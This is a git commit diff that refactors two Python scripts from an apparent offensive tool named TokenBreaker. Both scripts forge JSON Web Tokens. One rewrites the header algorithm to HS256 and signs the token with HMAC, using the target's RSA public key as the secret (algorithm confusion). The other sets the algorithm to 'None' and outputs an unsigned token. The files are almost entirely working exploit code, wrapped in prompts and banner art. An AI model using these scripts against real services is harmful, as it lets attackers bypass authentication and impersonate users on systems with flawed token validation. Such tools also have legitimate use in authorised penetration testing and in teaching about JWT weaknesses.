e928bd5ef674d7c9e5439ee8cd83082cd03b0ca2
naryal2580 <naryal2580@gmail.com>
2018-10-24 16:21:51 +0530

    Modified!

--- RsaToHmac.py
+++ RsaToHmac.py
@@ -1,13 +1,36 @@
-#!/usr/bin/python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from __future__ import print_function
 
 import argparse
-import requests
 import base64
+import re
 import hmac
 import hashlib
-import sys
-from art import *
-from huepy import *
+from sys import exit
+
+def info(txt): return '[\033[1m\033[36m*\033[0m] \033[34m'+str(txt)+'\033[0m'
+def bad(txt): return '[\033[1m\033[31m-\033[0m] \033[31m'+str(txt)+'\033[0m'
+def warning(txt): return'[\033[1m\033[33m!\033[0m] \033[33m'+str(txt)+'\033[0m'
+def good(txt): return '[\033[1m\033[32m+\033[0m] \033[32m'+str(txt)+'\033[0m'
+def cool_input(text):
+    try:
+        _input = raw_input('[\033[1m\033[35m<\033[0m] \033[35m{}:\033[0m \033[3m'.format(text))
+        print('\033[0m', end='')
+        return _input
+    except KeyboardInterrupt:
+        print('\b\b  \033[0m')
+        print(bad('Exitting via Keyboard Interruption.'))
+        exit(0)
+    except EOFError:
+        print('\033[0m')
+        print(bad('Terminating!'))
+        exit(0)
+
+def banner():
+    logo = '\033[1m ___  ___   _     _         _  _ __  __   _   ___\n| _ \\/ __| /_\\   | |_ ___  | || |  \\/  | /_\\ / __|\n|   /\\__ \\/ _ \\  |  _/ _ \\ | __ | |\\/| |/ _ \\ (__\n|_|_\\|___/_/ \\_\\  \\__\\___/ |_||_|_|  |_/_/ \\_\\___|\n\033[0m'
+    print(logo)
 
 def pad_check(data):
     missing_padding = len(data) % 4
@@ -16,22 +39,27 @@ def pad_check(data):
     return data
 
 def print_header(token,pubkey):
-    base64header=pad_check(token.split('.')[0])
-    base64payload=pad_check(token.split('.')[1])
-    print blue("\nDecoded Header value is : "+base64.b64decode(base64header))
-    print blue("Decode Payload value is : "+base64.b64decode(base64payload))
-    header=raw_input("\nEnter your header Value: ")
-    payload=raw_input("Enter your payload value: ")
+    header = base64.b64decode(pad_check(token.split('.')[0]))
+    payload = base64.b64decode(pad_check(token.split('.')[1]))
+    print(info("Decoded Header value: {}".format(header)))
+    print(info("Decode Payload value: {}".format(payload)))
+    header = re.sub('"alg":".{5}"', '"alg":"HS256"', header)
+    print(info("New header value with HMAC: {}".format(header)))
+    modify_response = cool_input("Modify Header? [y/N]")
+    if modify_response.lower() == 'y':
+        header = cool_input("Enter your header with 'alg' field set to 'HS256'")
+        print(info("Header set to: {}".format(header)))
+    payload = cool_input("Enter Your Payload value")
     base64header = base64.b64encode(header).rstrip('=')
     base64payload = base64.b64encode(payload).rstrip('=')
     try:
         f=open(pubkey,'r')
     except IOError:
-        print red("Unable to open file!")
+        print(bad("Unable to open file!"))
         exit(1)
     headerandpayload = base64header + '.' + base64payload
     finaljwt = headerandpayload+'.'+base64.b64encode(hmac.new(f.read(), msg=headerandpayload, digestmod=hashlib.sha256).digest()).replace('/','_').replace('+','-').strip('=')
-    print green("\nSuccessfully encoded Token: \n" + finaljwt)
+    print(good("Successfully Encoded Token: {}".format(finaljwt)))
 
 def main():
     parser = argparse.ArgumentParser(description='TokenBreaker: 2.RSAtoHMAC',
@@ -40,7 +68,7 @@ def main():
     requiredparser.add_argument('-t','--token',help="JWT Token value",required=True)
     requiredparser.add_argument('-p','--pubkey',help="Path to Public key File",required=True)
     args = parser.parse_args()
-    tprint('RSA to HMAC')
+    banner()
     print_header(args.token,args.pubkey)
 
 if __name__=='__main__':
--- TheNone.py
+++ TheNone.py
@@ -1,11 +1,34 @@
-#!/usr/bin/python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from __future__ import print_function
 
 import argparse
 import base64
-import sys
 import re
-from art import *
-from huepy import *
+from sys import exit
+
+def info(txt): return '[\033[1m\033[36m*\033[0m] \033[34m'+str(txt)+'\033[0m'
+def bad(txt): return '[\033[1m\033[31m-\033[0m] \033[31m'+str(txt)+'\033[0m'
+def warning(txt): return'[\033[1m\033[33m!\033[0m] \033[33m'+str(txt)+'\033[0m'
+def good(txt): return '[\033[1m\033[32m+\033[0m] \033[32m'+str(txt)+'\033[0m'
+def cool_input(text):
+    try:
+        _input = raw_input('[\033[1m\033[35m<\033[0m] \033[35m{}:\033[0m \033[3m'.format(text))
+        print('\033[0m', end='')
+        return _input
+    except KeyboardInterrupt:
+        print('\b\b  \033[0m')
+        print(bad('Exitting via Keyboard Interruption.'))
+        exit(0)
+    except EOFError:
+        print('\033[0m')
+        print(bad('Terminating!'))
+        exit(0)
+
+def banner():
+    logo = '\033[1m ________         _  __\n/_  __/ /  ___   / |/ /__  ___  ___\n / / / _ \\/ -_) /    / _ \\/ _ \\/ -_)\n/_/ /_//_/\\__/ /_/|_/\\___/_//_/\\__/\n\033[0m'
+    print(logo)
 
 def verify_Padding(data):
     missing_padding = len(data) % 4
@@ -16,21 +39,20 @@ def verify_Padding(data):
 def processTheNoneToken(token):
     header=base64.b64decode(verify_Padding(token.split('.')[0]))
     payload=base64.b64decode(verify_Padding(token.split('.')[1]))
-    print blue("\nDecoded Header value is : "+header)
-    print blue("Decode Payload value is : "+payload)
+    print(info("Decoded Header value: {}".format(header)))
+    print(info("Decoded Payload value: {}".format(payload)))
     header=re.sub('"alg":".{5}"','"alg":"None"',header)
-    print green("\nNew header value with none algorithm:")
-    print header
+    print(info("New header value with none algorithm: {}".format(header)))
 
-    modify_response=raw_input("\nModify Header? (y/n): ")
-    if modify_response == 'y':
-        header=raw_input("Enter your header with 'alg' field set to 'None': ")
-        print green("Header set to: " + header)
-    payload=raw_input("Enter your payload: ")
+    modify_response = cool_input("Modify Header? [y/N]")
+    if modify_response.lower() == 'y':
+        header = cool_input("Enter your header with 'alg' field set to 'None'")
+        print(info("Header set to: " + header))
+    payload = cool_input("Enter your payload")
     base64header = base64.b64encode(header).rstrip('=')
     base64payload = base64.b64encode(payload).rstrip('=')
     finaljwt = base64header + '.' + base64payload + "."
-    print green("\nSuccessfully encoded Token: \n" + finaljwt)
+    print(good("Successfully encoded Token: {}".format(finaljwt)))
 
 def main():
     parser = argparse.ArgumentParser(description='TokenBreaker: 1.TheNoneAlgorithm',
@@ -38,7 +60,7 @@ def main():
     requiredparser=parser.add_argument_group('required arguments')
     requiredparser.add_argument('-t','--token',help="JWT Token value",required=True)
     args = parser.parse_args()
-    tprint('The None')
+    banner()
     processTheNoneToken(args.token)
 
 if __name__=='__main__':
